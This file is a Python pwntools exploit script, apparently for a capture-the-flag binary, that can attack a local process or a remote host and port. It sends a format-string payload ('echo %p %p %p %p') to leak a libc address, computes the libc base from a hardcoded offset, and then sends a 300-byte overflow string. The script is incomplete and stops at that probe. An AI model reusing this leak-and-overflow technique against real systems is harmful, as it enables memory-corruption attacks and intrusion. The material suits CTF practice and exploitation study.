from pwn import *
from binascii import unhexlify

BINARY = './pwn'
LIBC = './libc.so.6'


def init():
	log.info("For remote: %s HOST PORT" % sys.argv[0])
	if len(sys.argv) > 2:
		p = remote(sys.argv[1], int(sys.argv[2]))
		return p

	else:
		# Debug
		if len(sys.argv) > 1 and sys.argv[1] == '-d':
			p = gdb.debug(BINARY,'''
			d main+166
			continue
			'''.format(BINARY))

		else:
			p = process(BINARY)

		return p

def getLibcBase():
	p.recvuntil(b'$')
	p.sendline(b'date')
	p.recvuntil(b'$')
	p.sendline(b'echo %p %p %p %p')


	res = p.recvuntil('\n').strip().decode().split(' ')[3][2:].rjust(8, "0")


	leak = u64(unhexlify(res).rjust(8, b'\x00'), endian='big')

	log.info('Libc leak @ {}'.format(hex(leak)))

	offset = 0x1D5D80 # A mano

	libc_base = leak - offset

	log.info('Libc base @ {}'.format(hex(libc_base)))

	return libc_base


# main function
if __name__ == "__main__":

	p = init()

	elf = ELF(BINARY, checksec=False) # Extract data from binary
	libc = ELF(LIBC, checksec=False)

	libc.base = getLibcBase()

	p.recvuntil(b'$')
	pause()
	p.sendline(b'A'*300)
	pause()
